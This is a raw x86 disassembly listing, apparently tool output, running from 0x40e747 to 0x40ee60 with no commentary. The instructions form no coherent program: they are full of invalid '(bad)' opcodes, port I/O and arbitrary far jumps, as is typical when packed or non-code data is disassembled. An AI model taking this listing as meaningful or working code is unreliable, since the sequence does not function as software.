  40e747:	sbb    al,0x3b
  40e749:	mov    esi,0xbf1e57c2
  40e74e:	shl    BYTE PTR [ecx+0x63645f17],0xab
  40e755:	retf   0xab70
  40e758:	push   cs
  40e759:	jb     0x40e777
  40e75b:	dec    edx
  40e75c:	jecxz  0x40e7ae
  40e75e:	sahf   
  40e75f:	test   DWORD PTR [eax-0x51],esp
  40e762:	push   esi
  40e763:	or     DWORD PTR [esi+0x4991b490],eax
  40e769:	or     edx,DWORD PTR [ecx-0x46ad6e8c]
  40e76f:	and    eax,0xa5892c65
  40e774:	shl    bh,0x63
  40e777:	xchg   esp,eax
  40e778:	pop    ebp
  40e779:	and    DWORD PTR [ebp+0x4b],esi
  40e77c:	sub    bl,al
  40e77e:	out    dx,al
  40e77f:	imul   edx,DWORD PTR [edx+0x7963bdd5],0x7d129c5e
  40e789:	out    0x5b,al
  40e78b:	mov    ebx,0x5b7f408c
  40e790:	stos   DWORD PTR es:[edi],eax
  40e791:	xchg   esp,eax
  40e792:	mov    ebx,0xfa6dde92
  40e797:	cli    
  40e798:	not    BYTE PTR [ebx+eiz*4]
  40e79b:	ret    0xe2b8
  40e79e:	ficomp WORD PTR [ebp-0x58cdd62b]
  40e7a4:	dec    edx
  40e7a5:	test   eax,0x9fbe3d3c
  40e7aa:	push   eax
  40e7ab:	sub    DWORD PTR [ebx+0xc],edi
  40e7ae:	pop    es
  40e7af:	fnstenv [edi+esi*8+0x4a971f6e]
  40e7b6:	and    eax,0x492eddba
  40e7bb:	xchg   edx,eax
  40e7bc:	pop    eax
  40e7bd:	push   es
  40e7be:	mov    al,ds:0xabcc5bc7
  40e7c3:	in     al,0x1
  40e7c5:	sbb    BYTE PTR [ebx-0xa55fc8c],0x7c
  40e7cc:	lods   al,BYTE PTR ds:[esi]
  40e7cd:	mov    esi,0xcc6dd9b
  40e7d2:	inc    eax
  40e7d3:	mov    ds:0x7899380e,eax
  40e7d8:	sbb    al,0x49
  40e7da:	xchg   ebp,eax
  40e7db:	pavgb  mm6,QWORD PTR [ecx+0x5b]
  40e7df:	fimul  WORD PTR [eax+0x74086452]
  40e7e5:	scas   eax,DWORD PTR es:[edi]
  40e7e6:	xchg   ebp,eax
  40e7e7:	aas    
  40e7e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7e9:	dec    eax
  40e7ea:	adc    eax,0x9db6d6b8
  40e7ef:	test   BYTE PTR [ebx+0x75c6d292],0x38
  40e7f6:	sbb    BYTE PTR [eax+0x1041edd2],ch
  40e7fc:	loopne 0x40e7f9
  40e7fe:	ds aad 0x7a
  40e801:	popf   
  40e802:	mov    DWORD PTR [ecx+0x50e1c229],ebp
  40e808:	dec    ebp
  40e809:	bnd jo 0x40e836
  40e80c:	out    dx,eax
  40e80d:	or     al,0x7
  40e80f:	add    esp,DWORD PTR [edx]
  40e811:	or     eax,0x2430a2fb
  40e816:	mov    ah,BYTE PTR [ebx+0x6]
  40e819:	cmp    ah,BYTE PTR [ebx-0x757bd84f]
  40e81f:	adc    eax,edx
  40e821:	xchg   ebx,eax
  40e822:	mov    cs,WORD PTR [edi+eiz*4-0x6cddec40]
  40e829:	or     al,0x30
  40e82b:	repz jl 0x40e817
  40e82e:	inc    esi
  40e82f:	cmc    
  40e830:	out    dx,al
  40e831:	into   
  40e832:	mov    dl,0xd9
  40e834:	bound  eax,QWORD PTR ds:[edi-0x3cf5e6c0]
  40e83b:	loope  0x40e7ed
  40e83d:	add    BYTE PTR [eax],0xb2
  40e840:	or     bl,cl
  40e842:	or     al,0xcc
  40e844:	sub    BYTE PTR [edx+0x7690c308],cl
  40e84a:	stos   DWORD PTR es:[edi],eax
  40e84b:	vpmulhw xmm6,xmm4,XMMWORD PTR [ebx-0x5ab04108]
  40e853:	push   edx
  40e854:	mov    eax,ds:0xb4b1af5e
  40e859:	jg     0x40e89a
  40e85b:	scas   eax,DWORD PTR es:[edi]
  40e85c:	cmp    DWORD PTR [ecx*8+0x377bdf37],edi
  40e863:	pop    ds
  40e864:	std    
  40e865:	retf   
  40e866:	add    DWORD PTR [ebp+0x2b8b9f56],ebp
  40e86c:	sub    eax,0xe1dcbf8e
  40e871:	cld    
  40e872:	jns    0x40e83d
  40e874:	jmp    0x9cf3:0xb5d590e6
  40e87b:	ds das 
  40e87d:	pop    ecx
  40e87e:	fisttp WORD PTR [edx]
  40e880:	fsubr  DWORD PTR [esi+0x7]
  40e883:	ror    BYTE PTR [edi],1
  40e885:	nop
  40e886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e887:	cmp    eax,0x36328ac8
  40e88c:	or     ch,BYTE PTR [edi]
  40e88e:	and    al,0x10
  40e890:	add    esp,DWORD PTR [esp+ecx*4+0x2110e588]
  40e897:	sti    
  40e898:	retf   0x20c6
  40e89b:	arpl   WORD PTR [edx+eiz*2-0x76],ax
  40e89f:	push   0x2a
  40e8a1:	fwait
  40e8a2:	xor    BYTE PTR [eax+0x2],0x93
  40e8a6:	lods   al,BYTE PTR ds:[esi]
  40e8a7:	hlt    
  40e8a8:	ja     0x40e82d
  40e8aa:	jnp    0x40e8de
  40e8ac:	sub    ah,BYTE PTR [eax+0x48100f6b]
  40e8b2:	push   ebx
  40e8b3:	xchg   DWORD PTR [edx+0x4],esp
  40e8b6:	into   
  40e8b7:	(bad)  
  40e8b8:	test   BYTE PTR [edx+ecx*2-0x75],0xe9
  40e8bd:	jne    0x40e84b
  40e8bf:	cmp    dl,BYTE PTR [esi+0x74]
  40e8c2:	mov    esp,0x2ca863b2
  40e8c7:	(bad)
  40e8ca:	pop    es
  40e8cb:	test   al,0x3e
  40e8cd:	push   ebx
  40e8ce:	shr    BYTE PTR [ebp-0x2c],0x3d
  40e8d2:	pop    ebp
  40e8d3:	(bad)  
  40e8d4:	in     eax,0xe6
  40e8d6:	pop    esp
  40e8d7:	push   ebp
  40e8d8:	push   edi
  40e8d9:	mov    bh,0x1e
  40e8db:	(bad)  
  40e8dc:	mov    ebp,0x76d30021
  40e8e1:	xor    dl,0x45
  40e8e4:	int    0x30
  40e8e6:	sub    DWORD PTR [ebx+0x45],0x3eeb5e02
  40e8ed:	out    0x1a,al
  40e8ef:	add    eax,0x5618581d
  40e8f4:	jl     0x40e8a1
  40e8f6:	pop    ebx
  40e8f7:	test   al,0xd5
  40e8f9:	or     BYTE PTR [esi+0x47],0x19
  40e8fd:	lds    ebp,FWORD PTR [edx-0x4b]
  40e900:	sbb    dl,BYTE PTR [ebx-0x2d]
  40e903:	rcl    esp,cl
  40e905:	jmp    0x40e97c
  40e907:	adc    cl,BYTE PTR [ebp-0x1c]
  40e90a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e90b:	push   edx
  40e90c:	or     edi,ebx
  40e90e:	not    ebx
  40e910:	cli    
  40e911:	add    ebx,edx
  40e913:	xchg   esi,eax
  40e914:	xor    BYTE PTR [eax],bl
  40e916:	or     al,0xe8
  40e918:	jne    0x40e954
  40e91a:	or     bh,BYTE PTR ds:0xf50c060c
  40e920:	in     al,0x23
  40e922:	iret   
  40e923:	repz or BYTE PTR [edx+0x25],cl
  40e927:	jnp    0x40e987
  40e929:	inc    esi
  40e92a:	std    
  40e92b:	dec    ecx
  40e92c:	pop    edi
  40e92d:	xor    BYTE PTR [ebx-0x4],al
  40e930:	out    0x9d,al
  40e932:	fstp   QWORD PTR [edi+0x57]
  40e935:	jge    0x40e8c7
  40e937:	push   edx
  40e938:	dec    ebp
  40e939:	bound  ecx,QWORD PTR [edx+0x71e1a8c5]
  40e93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e940:	out    dx,ax
  40e942:	jmp    0x40e9bd
  40e944:	jbe    0x40e9c4
  40e946:	pop    esp
  40e947:	sbb    BYTE PTR [esi+0x590e6e6c],al
  40e94d:	pop    ebx
  40e94e:	pop    ebx
  40e94f:	mov    bh,0x52
  40e951:	lods   al,BYTE PTR ds:[esi]
  40e952:	push   esp
  40e953:	sub    dl,BYTE PTR [ecx+0x2a]
  40e956:	add    eax,0xe25ca54
  40e95b:	das    
  40e95c:	push   esi
  40e95d:	jns    0x40e932
  40e95f:	add    esi,DWORD PTR [ebx]
  40e961:	xor    al,0xea
  40e963:	arpl   WORD PTR [edx+ebp*2-0x75],dx
  40e967:	dec    esp
  40e968:	dec    esi
  40e969:	iret   
  40e96a:	shr    ebx,cl
  40e96c:	cmc    
  40e96d:	cmp    DWORD PTR [esi+0x62],esi
  40e970:	fwait
  40e971:	mov    ds:0xa5f26c2f,eax
  40e976:	aas    
  40e977:	mov    ebp,0x7a274bcc
  40e97c:	lods   al,BYTE PTR ds:[esi]
  40e97d:	lods   eax,DWORD PTR ds:[esi]
  40e97e:	or     eax,0x88c777e8
  40e983:	les    edi,FWORD PTR [eax]
  40e985:	aam    0x9a
  40e987:	add    al,0xd5
  40e989:	add    eax,0xbcaaa0fc
  40e98e:	push   ds
  40e98f:	xor    al,BYTE PTR [edx-0x491dfc90]
  40e995:	push   edx
  40e996:	pop    ds
  40e997:	mov    ds:0xd661822e,al
  40e99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e99d:	mov    al,ds:0x9f464219
  40e9a2:	(bad)  
  40e9a3:	shr    BYTE PTR [eax+0x664faa97],1
  40e9a9:	(bad)  
  40e9aa:	int    0x8b
  40e9ac:	and    BYTE PTR [eax-0x2d],dl
  40e9af:	test   BYTE PTR [ebp+0x67],cl
  40e9b2:	cmp    cl,BYTE PTR [ecx+eax*2-0x1c]
  40e9b6:	stc    
  40e9b7:	out    0xd,al
  40e9b9:	hlt    
  40e9ba:	xchg   ebx,eax
  40e9bb:	mov    dh,0x45
  40e9bd:	test   BYTE PTR [ecx],dl
  40e9bf:	int3   
  40e9c0:	out    dx,al
  40e9c1:	test   eax,0x3526fbe2
  40e9c6:	pop    esp
  40e9c7:	push   esi
  40e9c8:	mov    eax,0x24d163b8
  40e9cd:	add    cl,cl
  40e9cf:	(bad)  
  40e9d0:	iret   
  40e9d1:	or     eax,eax
  40e9d3:	xchg   ebp,eax
  40e9d4:	jmp    0x40e9b5
  40e9d6:	lock (bad) 
  40e9d8:	mov    ah,0x9b
  40e9da:	retf   0xa408
  40e9dd:	pop    edx
  40e9de:	ficomp WORD PTR [eax-0x4a2ec599]
  40e9e4:	repnz stos DWORD PTR es:[edi],eax
  40e9e6:	cmc    
  40e9e7:	cmp    al,0x7a
  40e9e9:	push   eax
  40e9ea:	(bad)  
  40e9eb:	pop    edi
  40e9ec:	fist   DWORD PTR [ebx]
  40e9ee:	mov    al,0x13
  40e9f0:	pushf  
  40e9f1:	das    
  40e9f2:	xor    cl,BYTE PTR [esi+eiz*8]
  40e9f5:	out    0x3,eax
  40e9f7:	mov    eax,0xe42188ad
  40e9fc:	out    dx,eax
  40e9fd:	jns    0x40e9ac
  40e9ff:	std    
  40ea00:	xlat   BYTE PTR ds:[ebx]
  40ea01:	repnz cmp cl,BYTE PTR [eax+0x29]
  40ea05:	adc    eax,0x514d4fe1
  40ea0a:	xlat   BYTE PTR ds:[ebx]
  40ea0b:	xchg   BYTE PTR [ebx+eax*2-0x4],al
  40ea0f:	inc    edx
  40ea10:	or     dl,bl
  40ea12:	in     eax,dx
  40ea13:	lods   eax,DWORD PTR ss:[esi]
  40ea15:	push   esi
  40ea16:	mov    ebx,DWORD PTR [esi-0x51]
  40ea19:	inc    edi
  40ea1a:	test   eax,0x68d9a65c
  40ea1f:	push   eax
  40ea20:	stos   DWORD PTR es:[edi],eax
  40ea21:	aad    0x18
  40ea23:	stos   DWORD PTR es:[edi],eax
  40ea24:	push   esi
  40ea25:	cmp    ecx,DWORD PTR [ebx+0x6aa58b8b]
  40ea2b:	lods   eax,DWORD PTR ds:[esi]
  40ea2c:	push   esi
  40ea2d:	out    dx,al
  40ea2e:	idiv   DWORD PTR [edx+0x6c]
  40ea31:	outs   dx,DWORD PTR ds:[esi]
  40ea32:	outs   dx,DWORD PTR ds:[esi]
  40ea33:	mov    bl,0xbd
  40ea35:	mov    ch,0x45
  40ea37:	mov    bh,0xdb
  40ea39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea3a:	fucomip st,st(3)
  40ea3c:	shr    edi,1
  40ea3e:	imul   DWORD PTR [ebp-0x7efbeb76]
  40ea44:	sub    eax,0x374191e2
  40ea49:	outs   dx,BYTE PTR ds:[esi]
  40ea4a:	lahf   
  40ea4b:	adc    al,0xf4
  40ea4d:	pop    edi
  40ea4e:	sahf   
  40ea4f:	leave  
  40ea50:	jp     0x40ea94
  40ea52:	adc    bh,ch
  40ea54:	sub    cl,0xe6
  40ea57:	fwait
  40ea58:	imul   eax,DWORD PTR [esi+esi*1],0x2d
  40ea5c:	dec    ecx
  40ea5d:	adc    al,BYTE PTR [esi]
  40ea5f:	and    DWORD PTR [ecx],0xffffff83
  40ea62:	rcl    DWORD PTR [eax-0x18c91253],0xcf
  40ea69:	lods   eax,DWORD PTR ds:[esi]
  40ea6a:	and    BYTE PTR [ecx+0x79],dl
  40ea6d:	out    dx,eax
  40ea6e:	jmp    0x2c13:0x13e31af5
  40ea75:	cs into 
  40ea77:	repz cmp eax,0xef9a697f
  40ea7d:	sti    
  40ea7e:	enter  0xca21,0xa5
  40ea82:	es retf 
  40ea84:	pop    ss
  40ea85:	(bad)  
  40ea86:	stc    
  40ea87:	fcmovbe st,st(3)
  40ea89:	fwait
  40ea8a:	mov    esp,0x4f0aec70
  40ea8f:	sbb    eax,0xc9cce75b
  40ea94:	xchg   ebx,eax
  40ea95:	lods   al,BYTE PTR ds:[esi]
  40ea96:	ins    DWORD PTR es:[edi],dx
  40ea97:	ss pusha 
  40ea99:	pop    eax
  40ea9a:	xchg   dl,dh
  40ea9c:	sbb    BYTE PTR [esi+0x63],bl
  40ea9f:	divps  xmm7,XMMWORD PTR [ecx-0x3a]
  40eaa3:	mov    ?,WORD PTR ds:0xc396e2f
  40eaa9:	mov    eax,ds:0x4a4d6765
  40eaae:	adc    eax,edx
  40eab0:	ins    BYTE PTR es:[edi],dx
  40eab1:	cdq    
  40eab2:	inc    eax
  40eab3:	rol    BYTE PTR cs:[edi-0x68],0x6d
  40eab8:	jmp    0xf3ec4a71
  40eabd:	imul   esp,DWORD PTR [esi-0x60],0x7b
  40eac1:	or     ah,BYTE PTR [ecx+esi*4-0x5c]
  40eac5:	mov    bh,0x3c
  40eac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eac8:	test   al,0x25
  40eaca:	retf   0x1b68
  40eacd:	(bad)  
  40eace:	xor    ebp,edx
  40ead0:	mov    al,BYTE PTR [eax+0x26]
  40ead3:	sub    esp,edi
  40ead5:	das    
  40ead6:	inc    edx
  40ead7:	mov    ds:0xedd09249,al
  40eadc:	jbe    0x40ea69
  40eade:	bound  eax,QWORD PTR [eax]
  40eae0:	mov    eax,cs:0x955f0122
  40eae6:	mov    dh,0x1b
  40eae8:	add    al,0xa0
  40eaea:	sti    
  40eaeb:	dec    eax
  40eaec:	jmp    0x4e21754a
  40eaf1:	or     BYTE PTR [ebx],0xd5
  40eaf4:	xchg   esp,eax
  40eaf5:	pop    ebx
  40eaf6:	les    ecx,FWORD PTR [ebp-0x6]
  40eaf9:	cdq    
  40eafa:	mov    ebx,0x8a952380
  40eaff:	mov    dh,0x5f
  40eb01:	mov    esp,DWORD PTR [ecx]
  40eb03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb04:	mul    DWORD PTR [esi+0x47]
  40eb07:	or     ah,0xa3
  40eb0a:	and    DWORD PTR [edx],0xffffff86
  40eb0d:	xchg   ebx,eax
  40eb0e:	mov    edi,0xa2bd7b96
  40eb13:	xchg   esi,eax
  40eb14:	push   edi
  40eb15:	inc    ebp
  40eb16:	or     al,0x61
  40eb18:	xchg   esi,eax
  40eb19:	dec    edx
  40eb1a:	and    eax,0x99272726
  40eb1f:	cwde   
  40eb20:	cwde   
  40eb21:	mov    al,0xc8
  40eb23:	(bad)  
  40eb24:	mov    ah,0x38
  40eb26:	mov    gs,WORD PTR [ecx-0x49]
  40eb29:	fld    TBYTE PTR [esi+ebp*2+0x6e]
  40eb2d:	adc    al,bh
  40eb2f:	xor    ebp,esp
  40eb31:	jb     0x40eacc
  40eb33:	dec    edx
  40eb34:	mov    ecx,0xa43870cc
  40eb39:	xlat   BYTE PTR ds:[ebx]
  40eb3a:	jmp    0x40eb2d
  40eb3c:	fwait
  40eb3d:	mov    edi,0x7dbf9bf9
  40eb42:	jmp    0xc0209119
  40eb47:	out    dx,eax
  40eb48:	mov    esi,0xdaf8defb
  40eb4d:	xlat   BYTE PTR ds:[ebx]
  40eb4e:	mov    esi,0xef7bcef6
  40eb53:	mov    ebp,0x87fdbef7
  40eb58:	push   cs
  40eb59:	sbb    eax,0x2640ca40
  40eb5e:	dec    ecx
  40eb5f:	adc    BYTE PTR [ebp+0x11],al
  40eb62:	in     eax,dx
  40eb63:	push   esi
  40eb64:	mov    ebp,DWORD PTR [ebp-0x2425d253]
  40eb6a:	fcomi  st,st(4)
  40eb6c:	je     0x40eb5c
  40eb6e:	add    cl,bh
  40eb70:	rep ins BYTE PTR es:[edi],dx
  40eb72:	or     al,0x43
  40eb74:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40eb76:	pushf  
  40eb77:	sti    
  40eb78:	push   cs
  40eb79:	add    eax,0xfa5022ef
  40eb7e:	mov    al,0x4c
  40eb80:	xchg   edx,eax
  40eb81:	sbb    eax,0xb4cdf3c7
  40eb86:	jl     0x40ec07
  40eb88:	mov    edx,0xa74e9d36
  40eb8d:	inc    edi
  40eb8e:	mov    ebx,0xd9dce5dd
  40eb93:	repz js 0x40ebd8
  40eb96:	push   eax
  40eb97:	stos   DWORD PTR es:[edi],eax
  40eb98:	push   ebp
  40eb99:	test   eax,0xd9ecea37
  40eb9e:	xor    ecx,ebp
  40eba0:	mov    ebx,0xf807cdf
  40eba5:	mov    esi,0xd2fc1ef7
  40ebaa:	and    al,0xad
  40ebac:	not    BYTE PTR [eax-0x1e26c0d1]
  40ebb2:	in     al,dx
  40ebb3:	test   eax,0xd89d8e55
  40ebb8:	loop   0x40eb6b
  40ebba:	daa    
  40ebbb:	dec    esi
  40ebbc:	rcr    dl,1
  40ebbe:	mov    ds,WORD PTR [eax]
  40ebc0:	les    esi,FWORD PTR [ebp-0x7a]
  40ebc3:	dec    ecx
  40ebc4:	or     eax,0x37804d19
  40ebc9:	or     eax,0x9afc7995
  40ebce:	xchg   edi,eax
  40ebd0:	add    BYTE PTR [edi+0x445dc43e],cl
  40ebd6:	mov    esp,0x548318a5
  40ebdb:	imul   ebx,edx,0xf79a1114
  40ebe1:	push   edi
  40ebe2:	push   0xe2b4da40
  40ebe7:	out    dx,al
  40ebe8:	fwait
  40ebe9:	mov    ebp,DWORD PTR [ebp+edi*2+0x49a0ac80]
  40ebf0:	push   ebp
  40ebf1:	add    dl,dl
  40ebf3:	or     al,cl
  40ebf5:	mov    ecx,0x1528938e
  40ebfa:	add    BYTE PTR [ecx],ch
  40ebfc:	or     esp,edi
  40ebfe:	test   BYTE PTR [esi+0x3f],bh
  40ec01:	cmp    edx,DWORD PTR [ebp+0x4d1e3f3f]
  40ec07:	adc    al,0x60
  40ec09:	adc    DWORD PTR [eax-0x702e00c6],0x39e6f47e
  40ec13:	repz xlat BYTE PTR ds:[ebx]
  40ec15:	fnstenv [esi-0x7d]
  40ec18:	add    dl,bh
  40ec1a:	sahf   
  40ec1b:	out    0xd9,eax
  40ec1d:	stos   BYTE PTR es:[edi],al
  40ec1e:	xor    DWORD PTR [esi-0x2e],eax
  40ec21:	sbb    ecx,DWORD PTR [ecx]
  40ec23:	scas   eax,DWORD PTR es:[edi]
  40ec24:	or     BYTE PTR [ebx],bh
  40ec26:	test   edi,esi
  40ec28:	push   0x40
  40ec2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec2b:	(bad)  
  40ec2c:	xor    eax,0x420953cf
  40ec31:	lea    edi,[ebx]
  40ec33:	int    0x6d
  40ec35:	inc    ebp
  40ec36:	inc    esi
  40ec37:	shl    BYTE PTR [edx+0x6ffba376],0xc8
  40ec3e:	adc    eax,0xf97d8d78
  40ec43:	data16 or BYTE PTR [edi+0x33312a54],bh
  40ec4a:	xor    eax,ebx
  40ec4c:	clc    
  40ec4d:	clc    
  40ec4e:	cmp    ch,ah
  40ec50:	jb     0x40ec8b
  40ec52:	xchg   ebx,eax
  40ec53:	fadd   QWORD PTR [eax+eiz*2]
  40ec56:	jnp    0x40ecd3
  40ec58:	fwait
  40ec59:	lods   eax,DWORD PTR ds:[esi]
  40ec5a:	lods   eax,DWORD PTR ds:[esi]
  40ec5b:	sub    eax,0x7c77855b
  40ec60:	jl     0x40ebfe
  40ec62:	push   0xffffffb5
  40ec64:	dec    edx
  40ec65:	adc    BYTE PTR [esi+esi*8],al
  40ec68:	push   ds
  40ec69:	pop    edx
  40ec6a:	adc    ch,BYTE PTR [edi+edi*1-0xa]
  40ec6e:	fsub   DWORD PTR [ebx-0x39]
  40ec71:	pop    ds
  40ec72:	jnp    0x40ec60
  40ec74:	mov    cl,0x53
  40ec76:	adc    BYTE PTR [edi-0x55],0xd5
  40ec7a:	call   0xa6a6:0x7b8b8b8b
  40ec81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec82:	es daa 
  40ec84:	es neg BYTE PTR es:[eax+edi*1]
  40ec89:	jo     0x40eceb
  40ec8b:	outs   dx,BYTE PTR ds:[esi]
  40ec8c:	call   edx
  40ec8e:	shl    dl,cl
  40ec90:	add    edi,DWORD PTR [edi-0x12]
  40ec93:	iret   
  40ec94:	mov    ebp,0x8585cee6
  40ec99:	or     ebp,0x66
  40ec9c:	jae    0x40ecc0
  40ec9e:	push   cs
  40ec9f:	inc    ebx
  40eca0:	ss aaa 
  40eca2:	aaa    
  40eca3:	fstp   DWORD PTR [eax+0x5f]
  40eca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eca7:	mov    ds:0x8e388755,eax
  40ecac:	sub    eax,0x96dafb71
  40ecb1:	pusha  
  40ecb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecb3:	pop    eax
  40ecb4:	scas   al,BYTE PTR es:[edi]
  40ecb5:	(bad)  
  40ecb6:	std    
  40ecb7:	and    BYTE PTR [eax-0x4f],dl
  40ecba:	push   cs
  40ecbb:	mov    bh,0xa1
  40ecbd:	in     eax,0xed
  40ecbf:	or     al,BYTE PTR [edx]
  40ecc1:	or     bl,al
  40ecc3:	mov    BYTE PTR [ebp-0x2829d273],cl
  40ecc9:	aaa    
  40ecca:	cmp    ecx,esi
  40eccc:	retf   0x4a29
  40eccf:	in     eax,0x32
  40ecd1:	mov    ch,0x7a
  40ecd3:	xchg   ebp,eax
  40ecd4:	mov    cl,0xb1
  40ecd6:	xor    esi,ebp
  40ecd8:	sahf   
  40ecd9:	fwait
  40ecda:	in     al,0xc1
  40ecdc:	mov    ebx,0xfbe77c1b
  40ece1:	pop    ss
  40ece2:	adc    BYTE PTR [ecx+ebx*1],dh
  40ece5:	les    esp,FWORD PTR [ebp-0x2a]
  40ece8:	aaa    
  40ece9:	add    esi,DWORD PTR [esi-0x416344c9]
  40ecef:	nop
  40ecf0:	jo     0x40ed67
  40ecf2:	jne    0x40ec7f
  40ecf4:	scas   eax,DWORD PTR es:[edi]
  40ecf5:	push   ds
  40ecf6:	sbb    eax,0x36f9ec72
  40ecfb:	fld    TBYTE PTR [ebp-0xf9a05fc]
  40ed01:	jge    0x40ecab
  40ed03:	das    
  40ed04:	loop   0x40ed5b
  40ed06:	sbb    edi,DWORD PTR [edx]
  40ed08:	cld    
  40ed09:	and    BYTE PTR [ecx],al
  40ed0b:	sbb    DWORD PTR [ecx],esp
  40ed0d:	loop   0x40ed10
  40ed0f:	and    al,0x2d
  40ed11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed12:	dec    edx
  40ed13:	cwde   
  40ed14:	and    BYTE PTR [esi],ah
  40ed16:	sbb    eax,0x988362b7
  40ed1b:	test   BYTE PTR [eax+0x46],al
  40ed1e:	or     DWORD PTR [ecx],ebx
  40ed20:	mul    DWORD PTR [edx]
  40ed22:	inc    esi
  40ed23:	xor    ecx,eax
  40ed25:	xor    DWORD PTR [ecx],eax
  40ed27:	sbb    al,0xc1
  40ed29:	xchg   ebx,eax
  40ed2a:	outs   dx,BYTE PTR ds:[esi]
  40ed2b:	dec    ecx
  40ed2c:	cdq    
  40ed2d:	outs   dx,BYTE PTR ds:[esi]
  40ed2e:	lods   al,BYTE PTR ds:[esi]
  40ed2f:	ret    0x380
  40ed32:	dec    edi
  40ed33:	xor    cl,al
  40ed35:	push   0x0
  40ed37:	jbe    0x40ed55
  40ed39:	xchg   esi,eax
  40ed3a:	retf   
  40ed3b:	stos   BYTE PTR es:[edi],al
  40ed3c:	les    ebx,FWORD PTR [esi+edi*4+0x36]
  40ed40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed41:	outs   dx,BYTE PTR ds:[esi]
  40ed42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed43:	mov    esi,0x7afebe9e
  40ed48:	fld    TBYTE PTR [esi+0x10]
  40ed4b:	inc    eax
  40ed4c:	pop    edi
  40ed4d:	or     BYTE PTR [ecx-0x49],al
  40ed50:	fist   DWORD PTR [ecx-0x3f]
  40ed53:	das    
  40ed54:	xor    ch,BYTE PTR ds:0x749aa563
  40ed5a:	cwde   
  40ed5b:	sbb    BYTE PTR [ecx+0x4f],0x89
  40ed5f:	ret    
  40ed60:	or     al,0x8a
  40ed62:	imul   esp,DWORD PTR [esp+eax*2],0xffffffb8
  40ed66:	test   eax,0xd7b4e796
  40ed6b:	xor    ch,dl
  40ed6d:	pop    ebp
  40ed6e:	psubd  mm2,QWORD PTR [edi]
  40ed71:	xor    DWORD PTR [ecx+0x54a98e38],eax
  40ed77:	sub    cl,ah
  40ed79:	int    0xcd
  40ed7b:	xor    DWORD PTR ds:0xf7676d3d,edi
  40ed81:	mov    ecx,0x5b5bcd61
  40ed86:	pop    ebx
  40ed87:	lods   al,BYTE PTR ds:[esi]
  40ed88:	scas   eax,DWORD PTR es:[edi]
  40ed89:	scas   eax,DWORD PTR es:[edi]
  40ed8a:	rcl    ebp,cl
  40ed8c:	mov    bl,0xff
  40ed8e:	es daa 
  40ed90:	daa    
  40ed91:	imul   esi,DWORD PTR [esi],0x841969b
  40ed97:	and    DWORD PTR [eax],ecx
  40ed99:	ret    
  40ed9a:	nop
  40ed9b:	retf   
  40ed9c:	xchg   edi,eax
  40ed9d:	das    
  40ed9e:	xor    ebx,DWORD PTR [eax]
  40eda0:	or     al,0x90
  40eda2:	push   edx
  40eda3:	not    BYTE PTR [ecx-0x27]
  40eda6:	xor    eax,0xf5ec801a
  40edab:	jp     0x40ed9e
  40edad:	leave  
  40edae:	xchg   ebx,eax
  40edaf:	daa    
  40edb0:	das    
  40edb1:	mov    ds:0xe8c7434a,al
  40edb6:	int3   
  40edb7:	adc    al,0xd5
  40edb9:	push   0xffffffb5
  40edbb:	xor    DWORD PTR [edi],esi
  40edbd:	aaa    
  40edbe:	aaa    
  40edbf:	stc    
  40edc0:	xchg   esi,eax
  40edc1:	mov    bh,0xbc
  40edc3:	in     eax,0x75
  40edc5:	pop    es
  40edc6:	push   cs
  40edc7:	push   ds
  40edc8:	cmp    al,0xfc
  40edca:	rol    BYTE PTR [ebx-0xf8621f1],1
  40edd0:	lock loope 0x40edce
  40edd3:	sbb    esi,ebp
  40edd5:	cli    
  40edd6:	inc    esp
  40edd7:	sbb    BYTE PTR [ebp-0x54],al
  40edda:	scas   eax,DWORD PTR es:[edi]
  40eddb:	scas   al,BYTE PTR es:[edi]
  40eddc:	mov    dl,0xb2
  40edde:	mov    dl,0x42
  40ede0:	mov    bh,0xdd
  40ede2:	push   esi
  40ede3:	icebp  
  40ede4:	or     cl,BYTE PTR [ecx+0x42]
  40ede7:	mov    al,ds:0xd90d8251
  40edec:	(bad)  
  40eded:	or     ch,BYTE PTR [esi+0xc3bc061]
  40edf3:	ret    0xde5b
  40edf6:	mov    WORD PTR [ecx+0x74dcf5d3],es
  40edfc:	cmp    edi,DWORD PTR ds:0x573edd7a
  40ee02:	scas   eax,DWORD PTR es:[edi]
  40ee03:	lods   al,BYTE PTR ds:[esi]
  40ee04:	and    al,BYTE PTR [eax+eiz*1+0x1bd40528]
  40ee0b:	xor    eax,0x98262726
  40ee10:	call   0xf0ce:0xd7cee09a
  40ee17:	pop    ss
  40ee18:	mov    edi,0xe37a816d
  40ee1d:	and    ch,bl
  40ee1f:	or     edi,0xc78f7ada
  40ee25:	pop    esi
  40ee26:	call   0x6df2e11e
  40ee2b:	sahf   
  40ee2c:	cmp    DWORD PTR [edx-0x72],edi
  40ee2f:	inc    edi
  40ee30:	mov    esi,0xd6ee9972
  40ee35:	sbb    bh,BYTE PTR [ebp+0x75c424de]
  40ee3b:	test   al,0x8f
  40ee3d:	inc    ecx
  40ee3e:	jne    0x40ee42
  40ee40:	scas   eax,DWORD PTR es:[edi]
  40ee41:	mov    dl,0xf
  40ee43:	scas   eax,DWORD PTR es:[edi]
  40ee44:	out    dx,al
  40ee45:	test   eax,0x1b519199
  40ee4a:	ret    0x4475
  40ee4d:	mov    ah,0xe1
  40ee4f:	dec    esp
  40ee50:	mov    ds,WORD PTR [edx]
  40ee52:	mov    ds:0x48d3d528,al
  40ee57:	inc    eax
  40ee58:	inc    eax
  40ee59:	(bad)  
  40ee5a:	mov    ebp,0x3d707998
  40ee5f:	sahf   
  40ee60:	pop    ebp
